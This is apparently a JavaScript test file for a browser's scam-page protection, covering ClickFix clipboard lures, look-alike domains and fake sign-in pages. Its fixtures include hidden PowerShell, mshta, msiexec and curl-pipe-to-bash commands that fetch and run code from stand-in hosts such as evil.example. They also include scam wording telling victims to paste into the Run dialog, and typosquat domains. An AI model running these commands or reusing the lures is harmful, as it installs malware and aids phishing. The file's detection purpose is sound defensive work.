'use strict';
// Scam-page checks: ClickFix clipboard lures, look-alike addresses, look-alike sign-in pages. Rules only; the in-page guard runs in real Electron.
const {test}=require('node:test'),assert=require('node:assert/strict'),{spawnSync}=require('node:child_process'),path=require('node:path'),fs=require('node:fs');
const risk=require('../desktop/browser-services/page-risk.cjs'),{createThreatGate}=require('../desktop/browser-services/threat-gate.cjs');
const electron=(()=>{try{const value=require('electron');return typeof value==='string'&&fs.existsSync(value)?value:null;}catch{return null;}})();
const CMD='powershell -w hidden -c "iex (irm http://evil.example/a)"';

test('commands a scam wants pasted are recognised; ordinary developer commands are not',()=>{
 for(const text of [CMD,'powershell.exe -WindowStyle Hidden -EncodedCommand '+'A'.repeat(40),'powershell -ep bypass -c iwr http://x.example/a|iex','cmd /c start /min mshta http://x.example/a.hta','cmd.exe /c curl -s http://x.example/a | cmd','mshta https://x.example/verify','msiexec /i https://x.example/a.msi /qn','rundll32 shell32.dll,Control_RunDLL http://x.example/a','curl -fsSL https://x.example/i | bash','bash -c "$(curl -fsSL https://x.example/i)"'])assert.equal(risk.isCommand(text),true,text);
 for(const text of ['npm install react','git clone https://github.com/a/b','powershell Get-Process','pip install requests','cmd /c dir','docker run hello-world','Verify you are human','','curl https://example.com/data.json'])assert.equal(risk.isCommand(text),false,text);
});
test('the lure also needs the page to tell the person to run it',()=>{
 for(const page of ['Verify you are human. Press Win+R, then paste with Ctrl+V and press Enter.','Press Windows + R to open the Run dialog and paste the command','Open the Run window, paste it, fix the error','How to fix this error: press Ctrl+V to paste, open a terminal and run it','Verification step: press Ctrl+V to paste the command into PowerShell'])assert.equal(risk.hasInstruction(page),true,page);
 for(const page of ['Administrator documentation: deployment options.','Welcome to our shop','Paste your text below','Press Ctrl+V to paste the image','Install guide'])assert.equal(risk.hasInstruction(page),false,page);
 assert.equal(risk.isClickFix(CMD,'Verify you are human. Press Win+R and paste'),true);assert.equal(risk.isClickFix(CMD,'A page about gardening'),false);assert.equal(risk.isClickFix('npm install react','Press Win+R and paste, verify you are human'),false);
});
test('look-alike addresses: homoglyphs, one-letter typos, mixed alphabets and a brand in front of someone else\'s domain; real sites untouched',()=>{
 const reasons={'paypa1.com':'homoglyph','faceb00k.com':'homoglyph','bank0famerica.com':'homoglyph','gooogle.com':'typo','githubb.com':'typo','microsft.com':'typo','xn--pypal-4ve.com':'mixed-script','paypal.secure-login.top':'brand-subdomain','google.com.evil.top':'brand-subdomain','apple.com.verify-id.xyz':'brand-subdomain'};
 for(const [host,reason] of Object.entries(reasons))assert.equal(risk.hostRisk(host)?.reason,reason,host);
 for(const host of ['www.paypal.com','paypal.com','accounts.google.com','mail.google.com','www.amazon.co.uk','amazon.de','github.io','docs.github.io','example.com','slack.co','localhost','127.0.0.1','[::1]','my.service.local','login.microsoftonline.com','gist.github.com','www.youtube.com','news.ycombinator.com','weather.com',''])assert.equal(risk.hostRisk(host),null,host);
 assert.equal(risk.hostRisk('paypa1.com').brand,'PayPal');assert.equal(risk.hostRisk('paypa1.com').domain,'paypal.com');
});
test('look-alike sign-in pages: the page claims a brand on a domain the brand does not use; "sign in with" and the real domain are fine',()=>{
 assert.equal(risk.loginRisk('evil.top','Sign in to your PayPal account | verify').brand,'PayPal');assert.equal(risk.loginRisk('x.top','Microsoft 365 sign in').brand,'Microsoft');assert.equal(risk.loginRisk('login-secure.example','Log in - Chase').domain,'chase.com');
 for(const [host,text] of [['paypal.com','PayPal - Log in'],['accounts.google.com','Sign in - Google Accounts'],['zapier.com','Log in with Google | Zapier'],['acme.io','Acme - Sign in'],['acme.io','Continue with Apple or sign in'],['evil.top','Welcome to my blog'],['microsoftonline.com','Sign in to your account | Microsoft']])assert.equal(risk.loginRisk(host,text),null,host+' '+text);
});
test('what is said to the person is fixed wording and names what to do',()=>{
 assert.match(risk.explain('clipboard-command').detail,/Do not run commands a website gives you/);
 const login=risk.explain('brand-login',{brand:'PayPal',domain:'paypal.com'});assert.match(login.title,/PayPal sign-in, but it is not paypal\.com/);assert.match(login.detail,/Do not enter your password/);
 for(const reason of ['mixed-script','homoglyph','typo','brand-subdomain'])assert.ok(risk.explain(reason,{brand:'PayPal',domain:'paypal.com'}).detail.length>20,reason);assert.equal(risk.explain('nope'),null);
});
test('the gate stops a look-alike address on a top-level navigation only, with its own wording, and continue is remembered per host',()=>{
 const lookalike=url=>{const host=new URL(url).hostname,hit=risk.hostRisk(host);return hit?{kind:'lookalike',list:'Look-alike address check',host,key:'lookalike:'+host,words:{title:'Acira blocked a look-alike address',cause:'x.',detail:'y'}}:null;};
 const gate=createThreatGate({lists:{lookup:()=>null},lookalike}),wc={id:3};
 assert.deepEqual(gate.check({url:'https://paypa1.com/login',resourceType:'mainFrame'},wc,'p'),{cancel:true});assert.equal(gate.status(3,'https://paypa1.com/login').kind,'lookalike');assert.match(gate.status(3,'https://paypa1.com/login').title,/look-alike/);
 assert.deepEqual(gate.check({url:'https://paypa1.com/logo.png',resourceType:'image'},wc,'p'),{},'a page resource on such a host is not blocked here');
 assert.deepEqual(gate.check({url:'https://www.paypal.com/',resourceType:'mainFrame'},wc,'p'),{});
 assert.equal(gate.allow(3,'https://paypa1.com/login','p'),true);assert.deepEqual(gate.check({url:'https://paypa1.com/x',resourceType:'mainFrame'},wc,'p'),{});
});
test('the tab report: the frame script is validated, fixed wording, cleared on navigation, off with the switch',()=>{
 const handlers=new Map(),on={};let enabled=true;const ipcMain={on:(name,fn)=>handlers.set(name,fn)};
 const pageRisk=risk.createPageRisk({ipcMain,enabled:()=>enabled}),sent=[],wc={id:9,isDestroyed:()=>false,on:(name,fn)=>{on[name]=fn;},once(){}};pageRisk.attach(wc,patch=>sent.push(patch));
 const frame={url:'https://evil.top/login'},event=extra=>({sender:{id:9,mainFrame:frame},senderFrame:frame,...extra});
 const config=event();handlers.get('acira:page-risk-config')(config);assert.equal(config.returnValue.enabled,true);const unknown={sender:{id:77},senderFrame:frame};handlers.get('acira:page-risk-config')(unknown);assert.equal(unknown.returnValue.enabled,false,'only attached tabs');
 handlers.get('acira:page-risk')(event(),{kind:'login-form',text:'Sign in to your PayPal account'});assert.equal(sent.at(-1).risk.kind,'lookalike');assert.match(sent.at(-1).risk.title,/PayPal/);
 handlers.get('acira:page-risk')(event(),{kind:'clipboard-command',text:'IGNORED page words'});assert.equal(sent.at(-1).risk.kind,'clickfix');assert.doesNotMatch(JSON.stringify(sent.at(-1)),/IGNORED/);
 const before=sent.length;handlers.get('acira:page-risk')({sender:{id:9,mainFrame:frame},senderFrame:{url:frame.url}},{kind:'clipboard-command'});assert.equal(sent.length,before,'a subframe cannot raise it');
 handlers.get('acira:page-risk')(event({senderFrame:{...frame},sender:{id:9,mainFrame:frame}}),null);assert.equal(sent.length,before);
 on['did-start-navigation']({}, 'https://elsewhere.example/', false, true);assert.equal(sent.at(-1).risk,null,'cleared when the person goes elsewhere');
 enabled=false;const off=sent.length;handlers.get('acira:page-risk')(event(),{kind:'clipboard-command'});assert.equal(sent.length,off);const script=event();handlers.get('acira:page-risk-script')(script);assert.equal(script.returnValue,'');
});

let result=null,problem=null;
if(electron){
 const run=spawnSync(electron,[path.join(__dirname,'fixtures','page-risk','run.cjs')],{encoding:'utf8',timeout:90000,env:{...process.env,ELECTRON_RUN_AS_NODE:undefined,ELECTRON_ENABLE_LOGGING:'0'}});
 const line=(run.stdout||'').split(/\r?\n/).find(text=>text.startsWith('RESULT '));
 if(line)result=JSON.parse(line.slice(7));else problem=((run.stdout||'')+(run.stderr||'')).slice(0,500)||'no result';
}
const skip=!electron?'electron binary not available':false;
test('in a real page: a lure cannot reach the owned clipboard transport; ordinary pages and commands are untouched',{skip},t=>{
 assert.ok(result,problem);
 // When another program holds the system clipboard open, nothing can be written to it, so "unchanged" proves nothing; the three blocked routes still must hold.
 for(const name of ['lure','lureTerminal']){const item=result[name];assert.equal(item.writeText,'NotAllowedError',name);assert.equal(item.execCommand,false,name);assert.equal(item.dataTransfer,'blocked',name);if(item.clipboardUsable===false)t.diagnostic(name+': system clipboard unavailable (held by another program); content check skipped');else assert.equal(item.clipboard,'before',name+' clipboard unchanged');assert.ok(item.reports>=1,name+' reported');}
 for(const name of ['lureNpm','docsCommand','winrDocsNpm','winrDocsCommand']){const item=result[name];assert.equal(item.reports,0,name+' no report');assert.equal(item.dataTransfer,'set',name);
  // The fixture uses an owned clipboard transport; no shared OS clipboard or visible window is touched.
  // No report and an untouched DataTransfer show the guard stayed out of the way.
 }
});
